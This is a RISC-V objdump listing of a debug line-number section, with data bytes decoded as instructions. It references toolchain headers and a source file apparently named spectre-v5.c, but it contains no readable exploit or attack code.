      68:	752d                	lui	a0,0xfffeb
      6a:	6b6e                	ld	s6,216(sp)
      6c:	6f6e                	ld	t5,216(sp)
      6e:	652d6e77          	0x652d6e77
      72:	666c                	ld	a1,200(a2)
      74:	636e692f          	0x636e692f
      78:	756c                	ld	a1,232(a0)
      7a:	6564                	ld	s1,200(a0)
      7c:	7379732f          	0x7379732f
      80:	2f00                	fld	fs0,24(a4)
      82:	2f74706f          	j	47b78 <_tbss_end+0x47af4>
      86:	6972                	ld	s2,280(sp)
      88:	36766373          	csrrsi	t1,0x367,12
      8c:	2f34                	fld	fa3,88(a4)
      8e:	696c                	ld	a1,208(a0)
      90:	2f62                	fld	ft10,24(sp)
      92:	2f636367          	0x2f636367
      96:	6972                	ld	s2,280(sp)
      98:	36766373          	csrrsi	t1,0x367,12
      9c:	2d34                	fld	fa3,88(a0)
      9e:	6e75                	lui	t3,0x1d
      a0:	776f6e6b          	0x776f6e6b
      a4:	2d6e                	fld	fs10,216(sp)
      a6:	6c65                	lui	s8,0x19
      a8:	2f66                	fld	ft10,88(sp)
      aa:	2e322e37          	lui	t3,0x2e322
      ae:	2f30                	fld	fa2,88(a4)
      b0:	6e69                	lui	t3,0x1a
      b2:	64756c63          	bltu	a0,t2,70a <_tbss_end+0x686>
      b6:	0065                	c.nop	25
      b8:	6300                	ld	s0,0(a4)
      ba:	6361                	lui	t1,0x18
      bc:	6568                	ld	a0,200(a0)
      be:	682e                	ld	a6,200(sp)
      c0:	0100                	addi	s0,sp,128
      c2:	0000                	unimp
      c4:	63657073          	csrci	0x636,10
      c8:	7274                	ld	a3,224(a2)
      ca:	2d65                	addiw	s10,s10,25
      cc:	3576                	fld	fa0,376(sp)
      ce:	632e                	ld	t1,200(sp)
      d0:	0200                	addi	s0,sp,256
      d2:	0000                	unimp
      d4:	645f 6665 7561      	0x75616665645f
      da:	746c                	ld	a1,232(s0)
      dc:	745f 7079 7365      	0x73657079745f
      e2:	682e                	ld	a6,200(sp)
      e4:	0300                	addi	s0,sp,384
      e6:	0000                	unimp
      e8:	6f6c                	ld	a1,216(a4)
      ea:	682e6b63          	bltu	t3,sp,780 <_tbss_end+0x6fc>
      ee:	0400                	addi	s0,sp,512
      f0:	0000                	unimp
      f2:	745f 7079 7365      	0x73657079745f
      f8:	682e                	ld	a6,200(sp)
      fa:	0400                	addi	s0,sp,512
      fc:	0000                	unimp
      fe:	64647473          	csrrci	s0,0x646,8
     102:	6665                	lui	a2,0x19
     104:	682e                	ld	a6,200(sp)
     106:	0500                	addi	s0,sp,640
     108:	0000                	unimp
     10a:	6572                	ld	a0,280(sp)
     10c:	6e65                	lui	t3,0x19
     10e:	2e74                	fld	fa3,216(a2)
     110:	0068                	addi	a0,sp,12
     112:	0004                	0x4
     114:	5f00                	lw	s0,56(a4)
     116:	69647473          	csrrci	s0,0x696,8
     11a:	746e                	ld	s0,248(sp)
     11c:	682e                	ld	a6,200(sp)
     11e:	0400                	addi	s0,sp,512
     120:	0000                	unimp
     122:	0000                	unimp
     124:	0209                	addi	tp,tp,2
     126:	1048                	addi	a0,sp,36
     128:	8000                	0x8000
     12a:	0000                	unimp
     12c:	0000                	unimp
     12e:	0100c603          	lbu	a2,16(ra) # 4010 <_tbss_end+0x3f8c>
     132:	0e090503          	lb	a0,224(s2) # 64d0 <_tbss_end+0x644c>
     136:	0100                	addi	s0,sp,128
     138:	0a090103          	lb	sp,160(s2)
     13c:	0100                	addi	s0,sp,128
     13e:	0a090203          	lb	tp,160(s2)
     142:	0100                	addi	s0,sp,128
     144:	0a090303          	lb	t1,160(s2)
     148:	0100                	addi	s0,sp,128
     14a:	0c090303          	lb	t1,192(s2)
     14e:	0100                	addi	s0,sp,128
     150:	08090603          	lb	a2,128(s2)
     154:	0100                	addi	s0,sp,128
     156:	04090603          	lb	a2,64(s2)
     15a:	0100                	addi	s0,sp,128
     15c:	14090303          	lb	t1,320(s2)
     160:	0100                	addi	s0,sp,128
     162:	06090303          	lb	t1,96(s2)
     166:	0100                	addi	s0,sp,128
     168:	16090403          	lb	s0,352(s2)
     16c:	0100                	addi	s0,sp,128
     16e:	0200                	addi	s0,sp,256
     170:	0304                	addi	s1,sp,384
     172:	06090303          	lb	t1,96(s2)
     176:	0100                	addi	s0,sp,128
     178:	0200                	addi	s0,sp,256
     17a:	0304                	addi	s1,sp,384
     17c:	0a090403          	lb	s0,160(s2)
     180:	0100                	addi	s0,sp,128
     182:	0200                	addi	s0,sp,256
     184:	0304                	addi	s1,sp,384
     186:	18097903          	0x18097903
     18a:	0100                	addi	s0,sp,128
     18c:	0200                	addi	s0,sp,256
     18e:	0104                	addi	s1,sp,128
     190:	0306                	slli	t1,t1,0x1
     192:	0900                	addi	s0,sp,144
     194:	000a                	c.slli	zero,0x2
     196:	0001                	nop
     198:	0402                	slli	s0,s0,0x0
     19a:	0602                	slli	a2,a2,0x0
     19c:	0a097903          	0xa097903
     1a0:	0100                	addi	s0,sp,128
     1a2:	0200                	addi	s0,sp,256
     1a4:	0104                	addi	s1,sp,128
     1a6:	0306                	slli	t1,t1,0x1
     1a8:	0900                	addi	s0,sp,144
     1aa:	000a                	c.slli	zero,0x2
     1ac:	0601                	addi	a2,a2,0
     1ae:	0c091203          	lh	tp,192(s2)
     1b2:	0100                	addi	s0,sp,128
     1b4:	0204                	addi	s1,sp,256
     1b6:	097fa503          	lw	a0,151(t6)
     1ba:	0008                	0x8
     1bc:	0301                	addi	t1,t1,0
     1be:	0901                	addi	s2,s2,0
     1c0:	0016                	c.slli	zero,0x5
     1c2:	0301                	addi	t1,t1,0
     1c4:	0901                	addi	s2,s2,0
     1c6:	0008                	0x8
     1c8:	0301                	addi	t1,t1,0
     1ca:	0902                	slli	s2,s2,0x0
     1cc:	000a                	c.slli	zero,0x2
     1ce:	0301                	addi	t1,t1,0
     1d0:	0901                	addi	s2,s2,0
     1d2:	0006                	c.slli	zero,0x1
     1d4:	0301                	addi	t1,t1,0
     1d6:	0901                	addi	s2,s2,0
     1d8:	0018                	0x18
     1da:	0301                	addi	t1,t1,0
     1dc:	0901                	addi	s2,s2,0
     1de:	000e                	c.slli	zero,0x3
     1e0:	0301                	addi	t1,t1,0
     1e2:	0901                	addi	s2,s2,0
     1e4:	0014                	0x14
     1e6:	0301                	addi	t1,t1,0
     1e8:	0901                	addi	s2,s2,0
     1ea:	0012                	c.slli	zero,0x4
     1ec:	0301                	addi	t1,t1,0
     1ee:	0902                	slli	s2,s2,0x0
     1f0:	0012                	c.slli	zero,0x4
     1f2:	0301                	addi	t1,t1,0
     1f4:	0901                	addi	s2,s2,0
     1f6:	001a                	c.slli	zero,0x6
     1f8:	0301                	addi	t1,t1,0
     1fa:	0901                	addi	s2,s2,0
     1fc:	0016                	c.slli	zero,0x5
     1fe:	0001                	nop
     200:	0402                	slli	s0,s0,0x0
     202:	0302                	slli	t1,t1,0x0
     204:	00120977          	0x120977
     208:	0001                	nop
     20a:	0402                	slli	s0,s0,0x0
     20c:	0601                	addi	a2,a2,0
     20e:	0a090003          	lb	zero,160(s2)
     212:	0100                	addi	s0,sp,128
     214:	0306                	slli	t1,t1,0x1
     216:	090c                	addi	a1,sp,144
     218:	000c                	0xc
     21a:	0301                	addi	t1,t1,0
     21c:	00080907          	0x80907
     220:	0301                	addi	t1,t1,0
     222:	000c0903          	lb	s2,0(s8) # 19000 <_tbss_end+0x18f7c>
     226:	0301                	addi	t1,t1,0
     228:	0901                	addi	s2,s2,0
     22a:	0004                	0x4
     22c:	0301                	addi	t1,t1,0
     22e:	0901                	addi	s2,s2,0
     230:	0004                	0x4
     232:	0301                	addi	t1,t1,0
     234:	0901                	addi	s2,s2,0
     236:	000c                	0xc
     238:	0301                	addi	t1,t1,0
     23a:	0901                	addi	s2,s2,0
     23c:	001e                	c.slli	zero,0x7
     23e:	0301                	addi	t1,t1,0
     240:	0902                	slli	s2,s2,0x0
     242:	0010                	0x10
     244:	0301                	addi	t1,t1,0
     246:	0902                	slli	s2,s2,0x0
     248:	000a                	c.slli	zero,0x2
     24a:	0301                	addi	t1,t1,0
     24c:	0902                	slli	s2,s2,0x0
     24e:	0008                	0x8
     250:	0301                	addi	t1,t1,0
     252:	00040903          	lb	s2,0(s0) # fffffffffffe0000 <_end+0xffffffff7ffc4d80>
     256:	0301                	addi	t1,t1,0
     258:	0901                	addi	s2,s2,0
     25a:	000c                	0xc
     25c:	0301                	addi	t1,t1,0
     25e:	0902                	slli	s2,s2,0x0
     260:	0018                	0x18
     262:	0301                	addi	t1,t1,0
     264:	00060903          	lb	s2,0(a2) # 19000 <_tbss_end+0x18f7c>
     268:	0001                	nop
     26a:	0402                	slli	s0,s0,0x0
     26c:	09010303          	lb	t1,144(sp) # 50b04b2 <_tbss_end+0x50b042e>
     270:	0006                	c.slli	zero,0x1
     272:	0001                	nop
     274:	0402                	slli	s0,s0,0x0
     276:	097f0303          	lb	t1,151(t5)
     27a:	0014                	0x14
     27c:	0001                	nop
     27e:	0402                	slli	s0,s0,0x0
     280:	0601                	addi	a2,a2,0
     282:	0a090003          	lb	zero,160(s2)
     286:	0100                	addi	s0,sp,128
     288:	0306                	slli	t1,t1,0x1
     28a:	0905                	addi	s2,s2,1
     28c:	000c                	0xc
     28e:	0301                	addi	t1,t1,0
     290:	0905                	addi	s2,s2,1
     292:	0006                	c.slli	zero,0x1
     294:	0301                	addi	t1,t1,0
     296:	0905                	addi	s2,s2,1
     298:	0010                	0x10
     29a:	0301                	addi	t1,t1,0
     29c:	0905                	addi	s2,s2,1
     29e:	0016                	c.slli	zero,0x5
     2a0:	0301                	addi	t1,t1,0
     2a2:	0901                	addi	s2,s2,0
     2a4:	0006                	c.slli	zero,0x1
     2a6:	0301                	addi	t1,t1,0
     2a8:	0901                	addi	s2,s2,0
     2aa:	0010                	0x10
     2ac:	0301                	addi	t1,t1,0
     2ae:	0901                	addi	s2,s2,0
     2b0:	001e                	c.slli	zero,0x7
     2b2:	0301                	addi	t1,t1,0
     2b4:	0901                	addi	s2,s2,0
     2b6:	0018                	0x18
     2b8:	0301                	addi	t1,t1,0
     2ba:	0901                	addi	s2,s2,0
     2bc:	000c                	0xc
     2be:	0001                	nop
     2c0:	0402                	slli	s0,s0,0x0
     2c2:	0302                	slli	t1,t1,0x0
     2c4:	0028097b          	0x28097b
     2c8:	0001                	nop
     2ca:	0402                	slli	s0,s0,0x0
     2cc:	0601                	addi	a2,a2,0
     2ce:	0a090003          	lb	zero,160(s2)
     2d2:	0100                	addi	s0,sp,128
     2d4:	0200                	addi	s0,sp,256
     2d6:	0204                	addi	s1,sp,256
     2d8:	0306                	slli	t1,t1,0x1
     2da:	0971                	addi	s2,s2,28
     2dc:	000c                	0xc
     2de:	0001                	nop
     2e0:	0402                	slli	s0,s0,0x0
     2e2:	0601                	addi	a2,a2,0
     2e4:	0a090003          	lb	zero,160(s2)
     2e8:	0100                	addi	s0,sp,128
     2ea:	0306                	slli	t1,t1,0x1
     2ec:	091f 000a 0301      	0x301000a091f
     2f2:	0902                	slli	s2,s2,0x0
     2f4:	001c                	0x1c
     2f6:	0001                	nop
     2f8:	0402                	slli	s0,s0,0x0
     2fa:	0601                	addi	a2,a2,0
     2fc:	1e090003          	lb	zero,480(s2)
     300:	0100                	addi	s0,sp,128
     302:	0306                	slli	t1,t1,0x1
     304:	0901                	addi	s2,s2,0
     306:	001e                	c.slli	zero,0x7
     308:	0301                	addi	t1,t1,0
     30a:	0901                	addi	s2,s2,0
     30c:	000a                	c.slli	zero,0x2
     30e:	0301                	addi	t1,t1,0
     310:	097f                	0x97f
     312:	001c                	0x1c
     314:	0301                	addi	t1,t1,0
     316:	0901                	addi	s2,s2,0
     318:	0008                	0x8
     31a:	0301                	addi	t1,t1,0
     31c:	097f                	0x97f
     31e:	0004                	0x4
     320:	0301                	addi	t1,t1,0
     322:	0901                	addi	s2,s2,0
     324:	0004                	0x4
     326:	0301                	addi	t1,t1,0
     328:	097f                	0x97f
     32a:	0004                	0x4
     32c:	0301                	addi	t1,t1,0
     32e:	0902                	slli	s2,s2,0x0
     330:	0008                	0x8
     332:	0301                	addi	t1,t1,0
     334:	097e                	slli	s2,s2,0x1f
     336:	0004                	0x4
     338:	0301                	addi	t1,t1,0
     33a:	0902                	slli	s2,s2,0x0
     33c:	0002                	c.slli	zero,0x0
     33e:	0301                	addi	t1,t1,0
     340:	097e                	slli	s2,s2,0x1f
     342:	0004                	0x4
     344:	0301                	addi	t1,t1,0
     346:	0904                	addi	s1,sp,144
     348:	001c                	0x1c
     34a:	0301                	addi	t1,t1,0
     34c:	0901                	addi	s2,s2,0
     34e:	000a                	c.slli	zero,0x2
     350:	0301                	addi	t1,t1,0
     352:	097f                	0x97f
     354:	001c                	0x1c
     356:	0301                	addi	t1,t1,0
     358:	0901                	addi	s2,s2,0
     35a:	0008                	0x8
     35c:	0301                	addi	t1,t1,0
     35e:	097f                	0x97f
     360:	0004                	0x4
     362:	0301                	addi	t1,t1,0
     364:	0901                	addi	s2,s2,0
     366:	0004                	0x4
     368:	0301                	addi	t1,t1,0
     36a:	097f                	0x97f
     36c:	0004                	0x4
     36e:	0301                	addi	t1,t1,0
     370:	0902                	slli	s2,s2,0x0
     372:	0008                	0x8
     374:	0301                	addi	t1,t1,0
     376:	097e                	slli	s2,s2,0x1f
     378:	0004                	0x4
     37a:	0301                	addi	t1,t1,0
     37c:	0902                	slli	s2,s2,0x0
     37e:	0002                	c.slli	zero,0x0
     380:	0301                	addi	t1,t1,0
     382:	097e                	slli	s2,s2,0x1f
     384:	0004                	0x4
     386:	0001                	nop
     388:	0402                	slli	s0,s0,0x0
     38a:	0302                	slli	t1,t1,0x0
     38c:	0952                	slli	s2,s2,0x14
     38e:	001a                	c.slli	zero,0x6
     390:	0001                	nop
     392:	0402                	slli	s0,s0,0x0
     394:	0601                	addi	a2,a2,0
     396:	0a090003          	lb	zero,160(s2)
     39a:	0100                	addi	s0,sp,128
     39c:	0306                	slli	t1,t1,0x1
     39e:	0932                	slli	s2,s2,0xc
     3a0:	000c                	0xc
     3a2:	0901                	addi	s2,s2,0
     3a4:	000a                	c.slli	zero,0x2
     3a6:	0100                	addi	s0,sp,128
     3a8:	f401                	bnez	s0,2b0 <_tbss_end+0x22c>
     3aa:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     3ae:	2000                	fld	fs0,0(s0)
     3b0:	0000                	unimp
     3b2:	0100                	addi	s0,sp,128
     3b4:	fb01                	bnez	a4,2c4 <_tbss_end+0x240>
     3b6:	0d0e                	slli	s10,s10,0x3
     3b8:	0100                	addi	s0,sp,128
     3ba:	0101                	addi	sp,sp,0
     3bc:	0001                	nop
     3be:	0000                	unimp
     3c0:	0001                	nop
     3c2:	0100                	addi	s0,sp,128
     3c4:	00637273          	csrrci	tp,0x6,6
     3c8:	6300                	ld	s0,0(a4)
     3ca:	7472                	ld	s0,312(sp)
     3cc:	532e                	lw	t1,232(sp)
     3ce:	0100                	addi	s0,sp,128
     3d0:	0000                	unimp
     3d2:	0000                	unimp
     3d4:	0209                	addi	tp,tp,2
     3d6:	0000                	unimp
     3d8:	8000                	0x8000
     3da:	0000                	unimp
     3dc:	0000                	unimp
     3de:	03011103          	lh	sp,48(sp)
     3e2:	0901                	addi	s2,s2,0
     3e4:	0002                	c.slli	zero,0x0
     3e6:	0301                	addi	t1,t1,0
     3e8:	0901                	addi	s2,s2,0
     3ea:	0002                	c.slli	zero,0x0
     3ec:	0301                	addi	t1,t1,0
     3ee:	0901                	addi	s2,s2,0
     3f0:	0002                	c.slli	zero,0x0
     3f2:	0301                	addi	t1,t1,0
     3f4:	0901                	addi	s2,s2,0
     3f6:	0002                	c.slli	zero,0x0
     3f8:	0301                	addi	t1,t1,0
     3fa:	0901                	addi	s2,s2,0
     3fc:	0002                	c.slli	zero,0x0
     3fe:	0301                	addi	t1,t1,0
     400:	0901                	addi	s2,s2,0
     402:	0002                	c.slli	zero,0x0
     404:	0301                	addi	t1,t1,0
     406:	0901                	addi	s2,s2,0
     408:	0002                	c.slli	zero,0x0
     40a:	0301                	addi	t1,t1,0
     40c:	0901                	addi	s2,s2,0
     40e:	0002                	c.slli	zero,0x0
     410:	0301                	addi	t1,t1,0
     412:	0901                	addi	s2,s2,0
     414:	0002                	c.slli	zero,0x0
     416:	0301                	addi	t1,t1,0
     418:	0901                	addi	s2,s2,0
     41a:	0002                	c.slli	zero,0x0
     41c:	0301                	addi	t1,t1,0
     41e:	0901                	addi	s2,s2,0
     420:	0002                	c.slli	zero,0x0
     422:	0301                	addi	t1,t1,0
     424:	0901                	addi	s2,s2,0
     426:	0002                	c.slli	zero,0x0
     428:	0301                	addi	t1,t1,0
     42a:	0901                	addi	s2,s2,0
     42c:	0002                	c.slli	zero,0x0
     42e:	0301                	addi	t1,t1,0
     430:	0901                	addi	s2,s2,0
     432:	0002                	c.slli	zero,0x0
     434:	0301                	addi	t1,t1,0
     436:	0901                	addi	s2,s2,0
     438:	0002                	c.slli	zero,0x0
     43a:	0301                	addi	t1,t1,0
     43c:	0901                	addi	s2,s2,0
     43e:	0002                	c.slli	zero,0x0
     440:	0301                	addi	t1,t1,0
     442:	0901                	addi	s2,s2,0
     444:	0002                	c.slli	zero,0x0
     446:	0301                	addi	t1,t1,0
     448:	0901                	addi	s2,s2,0
     44a:	0002                	c.slli	zero,0x0
     44c:	0301                	addi	t1,t1,0
     44e:	0901                	addi	s2,s2,0
     450:	0002                	c.slli	zero,0x0
     452:	0301                	addi	t1,t1,0
     454:	0901                	addi	s2,s2,0
     456:	0002                	c.slli	zero,0x0
     458:	0301                	addi	t1,t1,0
     45a:	0901                	addi	s2,s2,0
     45c:	0002                	c.slli	zero,0x0
     45e:	0301                	addi	t1,t1,0
     460:	0901                	addi	s2,s2,0
     462:	0002                	c.slli	zero,0x0
     464:	0301                	addi	t1,t1,0
     466:	0901                	addi	s2,s2,0
     468:	0002                	c.slli	zero,0x0
     46a:	0301                	addi	t1,t1,0
     46c:	0901                	addi	s2,s2,0
     46e:	0002                	c.slli	zero,0x0
     470:	0301                	addi	t1,t1,0
     472:	0901                	addi	s2,s2,0
     474:	0002                	c.slli	zero,0x0
     476:	0301                	addi	t1,t1,0
     478:	0901                	addi	s2,s2,0
     47a:	0002                	c.slli	zero,0x0
     47c:	0301                	addi	t1,t1,0
     47e:	0901                	addi	s2,s2,0
     480:	0002                	c.slli	zero,0x0
     482:	0301                	addi	t1,t1,0
     484:	0901                	addi	s2,s2,0
     486:	0002                	c.slli	zero,0x0
     488:	0301                	addi	t1,t1,0
     48a:	0901                	addi	s2,s2,0
     48c:	0002                	c.slli	zero,0x0
     48e:	0301                	addi	t1,t1,0
     490:	0901                	addi	s2,s2,0
     492:	0002                	c.slli	zero,0x0
     494:	0301                	addi	t1,t1,0
     496:	00020903          	lb	s2,0(tp) # ffffffffffff9000 <_end+0xffffffff7ffddd80>
     49a:	0301                	addi	t1,t1,0
     49c:	0901                	addi	s2,s2,0
     49e:	0002                	c.slli	zero,0x0
     4a0:	0301                	addi	t1,t1,0
     4a2:	00040903          	lb	s2,0(s0)
     4a6:	0301                	addi	t1,t1,0
     4a8:	0902                	slli	s2,s2,0x0
     4aa:	0002                	c.slli	zero,0x0
     4ac:	0301                	addi	t1,t1,0
     4ae:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     4b2:	0301                	addi	t1,t1,0
     4b4:	0906                	slli	s2,s2,0x1
     4b6:	0004                	0x4
     4b8:	0301                	addi	t1,t1,0
     4ba:	0901                	addi	s2,s2,0
     4bc:	0002                	c.slli	zero,0x0
     4be:	0301                	addi	t1,t1,0
     4c0:	0901                	addi	s2,s2,0
     4c2:	0008                	0x8
     4c4:	0301                	addi	t1,t1,0
     4c6:	0904                	addi	s1,sp,144
     4c8:	0002                	c.slli	zero,0x0
     4ca:	0301                	addi	t1,t1,0
     4cc:	00080903          	lb	s2,0(a6)
     4d0:	0301                	addi	t1,t1,0
     4d2:	00040903          	lb	s2,0(s0)
     4d6:	0301                	addi	t1,t1,0
     4d8:	0902                	slli	s2,s2,0x0
     4da:	0004                	0x4
     4dc:	0301                	addi	t1,t1,0
     4de:	0901                	addi	s2,s2,0
     4e0:	0004                	0x4
     4e2:	0301                	addi	t1,t1,0
     4e4:	0901                	addi	s2,s2,0
     4e6:	0004                	0x4
     4e8:	0301                	addi	t1,t1,0
     4ea:	0901                	addi	s2,s2,0
     4ec:	0004                	0x4
     4ee:	0301                	addi	t1,t1,0
     4f0:	0901                	addi	s2,s2,0
     4f2:	0004                	0x4
     4f4:	0301                	addi	t1,t1,0
     4f6:	0901                	addi	s2,s2,0
     4f8:	0004                	0x4
     4fa:	0301                	addi	t1,t1,0
     4fc:	0901                	addi	s2,s2,0
     4fe:	0004                	0x4
     500:	0301                	addi	t1,t1,0
     502:	0901                	addi	s2,s2,0
     504:	0004                	0x4
     506:	0301                	addi	t1,t1,0
     508:	0901                	addi	s2,s2,0
     50a:	0004                	0x4
     50c:	0301                	addi	t1,t1,0
     50e:	0901                	addi	s2,s2,0
     510:	0004                	0x4
     512:	0301                	addi	t1,t1,0
     514:	0901                	addi	s2,s2,0
     516:	0004                	0x4
     518:	0301                	addi	t1,t1,0
     51a:	0901                	addi	s2,s2,0
     51c:	0004                	0x4
     51e:	0301                	addi	t1,t1,0
     520:	0901                	addi	s2,s2,0
     522:	0004                	0x4
     524:	0301                	addi	t1,t1,0
     526:	0901                	addi	s2,s2,0
     528:	0004                	0x4
     52a:	0301                	addi	t1,t1,0
     52c:	0901                	addi	s2,s2,0
     52e:	0004                	0x4
     530:	0301                	addi	t1,t1,0
     532:	0901                	addi	s2,s2,0
     534:	0004                	0x4
     536:	0301                	addi	t1,t1,0
     538:	0901                	addi	s2,s2,0
     53a:	0004                	0x4
     53c:	0301                	addi	t1,t1,0
     53e:	0901                	addi	s2,s2,0
     540:	0004                	0x4
     542:	0301                	addi	t1,t1,0
     544:	0901                	addi	s2,s2,0
     546:	0004                	0x4
     548:	0301                	addi	t1,t1,0
     54a:	0901                	addi	s2,s2,0
     54c:	0004                	0x4
     54e:	0301                	addi	t1,t1,0
     550:	0901                	addi	s2,s2,0
     552:	0004                	0x4
     554:	0301                	addi	t1,t1,0
     556:	0901                	addi	s2,s2,0
     558:	0004                	0x4
     55a:	0301                	addi	t1,t1,0
     55c:	0901                	addi	s2,s2,0
     55e:	0004                	0x4
     560:	0301                	addi	t1,t1,0
     562:	0901                	addi	s2,s2,0
     564:	0004                	0x4
     566:	0301                	addi	t1,t1,0
     568:	0901                	addi	s2,s2,0
     56a:	0004                	0x4
     56c:	0301                	addi	t1,t1,0
     56e:	0901                	addi	s2,s2,0
     570:	0004                	0x4
     572:	0301                	addi	t1,t1,0
     574:	0901                	addi	s2,s2,0
     576:	0004                	0x4
     578:	0301                	addi	t1,t1,0
     57a:	0901                	addi	s2,s2,0
     57c:	0004                	0x4
     57e:	0301                	addi	t1,t1,0
     580:	0901                	addi	s2,s2,0
     582:	0004                	0x4
     584:	0301                	addi	t1,t1,0
     586:	0901                	addi	s2,s2,0
     588:	0004                	0x4
     58a:	0301                	addi	t1,t1,0
     58c:	0901                	addi	s2,s2,0
     58e:	0004                	0x4
     590:	0301                	addi	t1,t1,0
     592:	0901                	addi	s2,s2,0
     594:	0004                	0x4
     596:	0301                	addi	t1,t1,0
     598:	0905                	addi	s2,s2,1
     59a:	0004                	0x4
     59c:	0301                	addi	t1,t1,0
     59e:	0901                	addi	s2,s2,0
     5a0:	0008                	0x8
     5a2:	0301                	addi	t1,t1,0
     5a4:	0905                	addi	s2,s2,1
     5a6:	0004                	0x4
     5a8:	0301                	addi	t1,t1,0
     5aa:	0904                	addi	s1,sp,144
     5ac:	0008                	0x8
     5ae:	0301                	addi	t1,t1,0
     5b0:	0901                	addi	s2,s2,0
     5b2:	0008                	0x8
     5b4:	0301                	addi	t1,t1,0
     5b6:	00040903          	lb	s2,0(s0)
     5ba:	0301                	addi	t1,t1,0
     5bc:	0902                	slli	s2,s2,0x0
     5be:	0004                	0x4
     5c0:	0301                	addi	t1,t1,0
     5c2:	0902                	slli	s2,s2,0x0
     5c4:	0002                	c.slli	zero,0x0
     5c6:	0301                	addi	t1,t1,0
     5c8:	0904                	addi	s1,sp,144
     5ca:	0004                	0x4
     5cc:	0301                	addi	t1,t1,0
     5ce:	0901                	addi	s2,s2,0
     5d0:	0004                	0x4
     5d2:	0301                	addi	t1,t1,0
     5d4:	0901                	addi	s2,s2,0
     5d6:	0002                	c.slli	zero,0x0
     5d8:	0301                	addi	t1,t1,0
     5da:	0901                	addi	s2,s2,0
     5dc:	0004                	0x4
     5de:	0301                	addi	t1,t1,0
     5e0:	0901                	addi	s2,s2,0
     5e2:	0002                	c.slli	zero,0x0
     5e4:	0301                	addi	t1,t1,0
     5e6:	0902                	slli	s2,s2,0x0
     5e8:	0002                	c.slli	zero,0x0
     5ea:	0301                	addi	t1,t1,0
     5ec:	0904                	addi	s1,sp,144
     5ee:	0004                	0x4
     5f0:	0301                	addi	t1,t1,0
     5f2:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     5f6:	0301                	addi	t1,t1,0
     5f8:	0901                	addi	s2,s2,0
     5fa:	0002                	c.slli	zero,0x0
     5fc:	0301                	addi	t1,t1,0
     5fe:	0901                	addi	s2,s2,0
     600:	0002                	c.slli	zero,0x0
     602:	0301                	addi	t1,t1,0
     604:	0901                	addi	s2,s2,0
     606:	0002                	c.slli	zero,0x0
     608:	0301                	addi	t1,t1,0
     60a:	0901                	addi	s2,s2,0
     60c:	0002                	c.slli	zero,0x0
     60e:	0301                	addi	t1,t1,0
     610:	0901                	addi	s2,s2,0
     612:	0002                	c.slli	zero,0x0
     614:	0301                	addi	t1,t1,0
     616:	0901                	addi	s2,s2,0
     618:	0002                	c.slli	zero,0x0
     61a:	0301                	addi	t1,t1,0
     61c:	0901                	addi	s2,s2,0
     61e:	0002                	c.slli	zero,0x0
     620:	0301                	addi	t1,t1,0
     622:	0901                	addi	s2,s2,0
     624:	0002                	c.slli	zero,0x0
     626:	0301                	addi	t1,t1,0
     628:	0901                	addi	s2,s2,0
     62a:	0002                	c.slli	zero,0x0
     62c:	0301                	addi	t1,t1,0
     62e:	0901                	addi	s2,s2,0
     630:	0002                	c.slli	zero,0x0
     632:	0301                	addi	t1,t1,0
     634:	0901                	addi	s2,s2,0
     636:	0002                	c.slli	zero,0x0
     638:	0301                	addi	t1,t1,0
     63a:	0901                	addi	s2,s2,0
     63c:	0002                	c.slli	zero,0x0
     63e:	0301                	addi	t1,t1,0
     640:	0901                	addi	s2,s2,0
     642:	0002                	c.slli	zero,0x0
     644:	0301                	addi	t1,t1,0
     646:	0901                	addi	s2,s2,0
     648:	0002                	c.slli	zero,0x0
     64a:	0301                	addi	t1,t1,0
     64c:	0901                	addi	s2,s2,0
     64e:	0002                	c.slli	zero,0x0
     650:	0301                	addi	t1,t1,0
     652:	0901                	addi	s2,s2,0
     654:	0002                	c.slli	zero,0x0
     656:	0301                	addi	t1,t1,0
     658:	0901                	addi	s2,s2,0
     65a:	0002                	c.slli	zero,0x0
     65c:	0301                	addi	t1,t1,0
     65e:	0901                	addi	s2,s2,0
     660:	0002                	c.slli	zero,0x0
     662:	0301                	addi	t1,t1,0
     664:	0901                	addi	s2,s2,0
     666:	0002                	c.slli	zero,0x0
     668:	0301                	addi	t1,t1,0
     66a:	0901                	addi	s2,s2,0
     66c:	0002                	c.slli	zero,0x0
     66e:	0301                	addi	t1,t1,0
     670:	0901                	addi	s2,s2,0
     672:	0002                	c.slli	zero,0x0
     674:	0301                	addi	t1,t1,0
     676:	0901                	addi	s2,s2,0
     678:	0002                	c.slli	zero,0x0
     67a:	0301                	addi	t1,t1,0
     67c:	0901                	addi	s2,s2,0
     67e:	0002                	c.slli	zero,0x0
     680:	0301                	addi	t1,t1,0
     682:	0901                	addi	s2,s2,0
     684:	0002                	c.slli	zero,0x0
     686:	0301                	addi	t1,t1,0
     688:	0901                	addi	s2,s2,0
     68a:	0002                	c.slli	zero,0x0
     68c:	0301                	addi	t1,t1,0
     68e:	0901                	addi	s2,s2,0
     690:	0002                	c.slli	zero,0x0
     692:	0301                	addi	t1,t1,0
     694:	0901                	addi	s2,s2,0
     696:	0002                	c.slli	zero,0x0
     698:	0301                	addi	t1,t1,0
     69a:	0901                	addi	s2,s2,0
     69c:	0002                	c.slli	zero,0x0
     69e:	0301                	addi	t1,t1,0
     6a0:	0901                	addi	s2,s2,0
     6a2:	0002                	c.slli	zero,0x0
     6a4:	0301                	addi	t1,t1,0
     6a6:	0901                	addi	s2,s2,0
     6a8:	0002                	c.slli	zero,0x0
     6aa:	0301                	addi	t1,t1,0
     6ac:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     6b0:	0301                	addi	t1,t1,0
     6b2:	00040903          	lb	s2,0(s0)
     6b6:	0301                	addi	t1,t1,0
     6b8:	00040903          	lb	s2,0(s0)
     6bc:	0301                	addi	t1,t1,0
     6be:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     6c2:	0301                	addi	t1,t1,0
     6c4:	00040903          	lb	s2,0(s0)
     6c8:	0301                	addi	t1,t1,0
     6ca:	00040903          	lb	s2,0(s0)
     6ce:	0301                	addi	t1,t1,0
     6d0:	0901                	addi	s2,s2,0
     6d2:	0008                	0x8
     6d4:	0301                	addi	t1,t1,0
     6d6:	0902                	slli	s2,s2,0x0
     6d8:	0004                	0x4
     6da:	0301                	addi	t1,t1,0
     6dc:	0901                	addi	s2,s2,0
     6de:	0002                	c.slli	zero,0x0
     6e0:	0301                	addi	t1,t1,0
     6e2:	0901                	addi	s2,s2,0
     6e4:	0002                	c.slli	zero,0x0
